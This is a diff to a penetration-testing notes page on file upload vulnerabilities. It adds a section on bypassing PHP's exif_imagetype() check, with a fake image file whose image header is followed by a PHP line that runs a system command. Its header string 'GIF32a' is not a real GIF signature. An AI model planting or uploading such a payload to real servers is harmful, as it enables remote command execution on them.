@@ -1,7 +1,7 @@
 ---
 title: File Upload Vulnerabilities
 desc: Examples of File Upload Vulnerabilities.
-tags: [Web]
+tags: [FileUpload, Web]
 alts: []
 website:
 render_with_liquid: false
@@ -141,4 +141,17 @@ Connection: close
 
 def handleResponse(req, interesting):
     table.add(req)
+```
+
+<br />
+
+## Bypass exif_imagetype() for PHP
+
+Fake image file with exploit.php
+
+```php
+// exploit.php
+
+GIF32a
+<?php echo system('whoami'); ?>
 ```
